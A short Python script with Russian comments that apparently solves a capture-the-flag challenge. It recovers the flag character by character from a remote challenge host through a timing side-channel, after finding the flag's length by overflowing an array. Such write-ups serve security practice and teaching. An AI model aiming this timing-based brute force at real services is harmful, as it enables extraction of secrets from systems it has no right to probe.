import socket

# Длину флага можно узнать введя строку вида 12345678901234567890123456789012
# Добавляем по одному символу, пока программа не упадёт. Как только падает, происходит выход за пределы массива, а значит
# длина предыдущей строки является длиной флага

# Длина флага 32 символа
import string

host = "hasher.tasks.2gis.fun"
port = 1822

flag = "2GIS.CTF{**********************}"

last_time = 1.0
for i in range(9, 32):
    for char in string.ascii_letters + string.digits + "_":
        attempt_list = list(flag)
        attempt_list[i] = char
        attempt = "".join(attempt_list)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(attempt.encode() + b"\n")
        result = s.recv(1024)
        execution_time_str = str(result).split(" ")[2][:3]
        print(attempt)
        print(float(execution_time_str))
        if float(execution_time_str) > last_time:
            flag = attempt
            last_time = float(execution_time_str)
            break
